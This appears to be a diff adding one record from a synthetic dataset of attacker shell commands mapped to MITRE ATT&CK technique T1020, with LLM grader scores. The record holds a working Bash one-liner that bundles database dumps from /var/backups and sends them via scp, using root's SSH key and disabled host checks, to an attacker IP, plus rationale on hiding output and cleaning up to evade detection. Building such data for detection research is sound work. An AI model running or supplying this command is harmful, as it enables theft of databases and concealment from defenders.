@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1020",
+  "platform": "Linux",
+  "shell": "Bash",
+  "command": "ts=$(date +%s); find /var/backups -type f \\( -name '*.sql' -o -name '*.sql.gz' -o -name '*.dump' \\) -print0 | tar --null -T - -czf /tmp/dbdumps_${ts}.tgz >/dev/null 2>&1 && scp -q -C -i /root/.ssh/id_rsa -P 22 -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null /tmp/dbdumps_${ts}.tgz attacker@198.51.100.10:/var/tmp/.cache/db/ >/dev/null 2>&1 && rm -f /tmp/dbdumps_${ts}.tgz",
+  "explanation": "Finds common database dump files, compresses them into a single archive, and quietly exfiltrates using scp with non-interactive authentication.",
+  "rationale_steps": [
+    "Search backup locations for SQL dump patterns to target valuable data.",
+    "Create a compressed tarball to minimize size and number of transfer operations.",
+    "Exfiltrate with scp using SSH keys to avoid prompts and logs.",
+    "Suppress output and remove temporary files to reduce detection footprint."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1020-e93662d8-261e7fdf",
+  "source_prompt_hash": "e93662d8",
+  "timestamp_utc": "2025-09-30T09:01:25.255647Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed Bash pipeline with balanced quoting/parentheses, valid find/tar/scp flags, proper separators, and correct redirections.",
+        "semantic_score": 4,
+        "semantic_justification": "Command automates collection, compression, exfiltration via scp, and cleanup consistent with T1020, but assumes access to /var/backups and /root/.ssh/id_rsa despite 'Privilege: None', reducing realism.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T02:52:23.780565Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command is perfectly well-formed with balanced parentheses and braces, proper use of -print0/-null for null-delimited filenames, correct variable interpolation, valid flag formats for both tar and scp, and properly chained with && and semicolons.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1020 automated exfiltration: it timestamps the archive for uniqueness, uses find with multiple database dump extensions, compresses via tar, silently transfers using scp with key-based authentication and host-key checking disabled to an attacker-controlled IP in a hidden directory, then cleans up the local artifact to reduce forensic evidence.",
+        "combined_score": 5.0,
+        "confidence": 0.97,
+        "timestamp": "2026-02-18T22:21:28.531590Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses correct Bash syntax, including properly escaped parentheses for the find command, valid piping, and correctly sequenced logical operators.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements a data staging and exfiltration workflow using standard Linux utilities and non-interactive SSH configurations typical of automated adversary behavior.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:21:32.236287Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
